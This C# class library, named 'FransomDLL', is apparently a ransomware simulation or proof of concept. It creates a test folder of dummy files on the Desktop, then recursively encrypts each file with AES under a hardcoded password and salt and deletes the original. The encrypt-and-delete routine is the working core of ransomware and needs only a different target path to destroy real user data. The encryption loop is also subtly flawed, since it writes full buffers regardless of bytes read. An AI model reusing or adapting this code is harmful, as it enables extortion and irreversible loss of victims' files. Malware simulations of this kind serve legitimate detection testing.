using System;
using System.Collections.Specialized;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;

namespace FransomDLL
{
	public class Class1
	{
		public Class1()
		{

		}
		public static string password = "a1b2c3d4e5f6";
		public void Main(string[] args)
		{
			string DirectoryName = Environment.ExpandEnvironmentVariables("%USERPROFILE%\\Desktop\\") + "Fransom";
			Console.WriteLine("Creating folder: " + DirectoryName);
			Console.WriteLine("");
			Directory.CreateDirectory(DirectoryName);
			string[] lines = { "First line", "Second line", "Third line" };
			for (int i = 0; i < 10; i++)
			{
				string fileName = DirectoryName + "\\test_file" + i + ".txt";
				Console.WriteLine("Creating file: " + fileName);
				File.WriteAllLines(fileName, lines);
			}
			Console.WriteLine("");
			StringCollection stringCollection = new StringCollection();
			EnumeratePath(stringCollection, Environment.ExpandEnvironmentVariables(DirectoryName), "*.*", true);
			foreach (object obj in stringCollection)
			{
				string file_name = obj.ToString();
				Console.WriteLine("Encrypting and deleting object: " + file_name);
				string enc_file = file_name + ".enc";
				EncryptFile(file_name, enc_file, password);
				File.Delete(file_name);
			}
		}
		static StringCollection EnumeratePath(StringCollection allFiles, string path, string ext, bool scanDirOk)
		{
			string[] files = Directory.GetFiles(path, ext);
			foreach (string value in files)
			{
				bool flag = !allFiles.Contains(value);
				if (flag)
				{
					allFiles.Add(value);
				}
			}
			if (scanDirOk)
			{
				string[] directories = Directory.GetDirectories(path);
				bool flag2 = directories.Length != 0;
				if (flag2)
				{
					foreach (string text in directories)
					{
						try
						{
							EnumeratePath(allFiles, text, ext, scanDirOk);
						}
						catch (UnauthorizedAccessException)
						{
							Console.WriteLine("Access Denied for folder " + text);
						}
						catch (Exception e)
						{
							Console.WriteLine("Error: {0}", e.Message);
						}
					}
				}
			}
			return allFiles;
		}
		static void EncryptFile(string inputFileName, string outputFileName, string password)
		{
			try
			{
				FileStream inFile = new FileStream(inputFileName, FileMode.Open, FileAccess.Read);
				FileStream outFile = new FileStream(outputFileName, FileMode.OpenOrCreate, FileAccess.Write);
				RijndaelManaged algorithm = new RijndaelManaged();
				Rfc2898DeriveBytes key = new Rfc2898DeriveBytes(password, Encoding.ASCII.GetBytes("Salt123456"));

				algorithm.Key = key.GetBytes(algorithm.KeySize / 8);
				algorithm.IV = key.GetBytes(algorithm.BlockSize / 8);

				byte[] fileData = new byte[4096];
				CryptoStream encryptedStream = new CryptoStream(outFile, algorithm.CreateEncryptor(), CryptoStreamMode.Write);

				while (inFile.Read(fileData, 0, fileData.Length) != 0)
				{
					encryptedStream.Write(fileData, 0, fileData.Length);
				}

				encryptedStream.Flush();
				encryptedStream.Close();
				inFile.Close();
				outFile.Close();
			}
			catch (Exception e)
			{
				Console.WriteLine("Error: {0}", e.Message);
			}
		}
	}
}
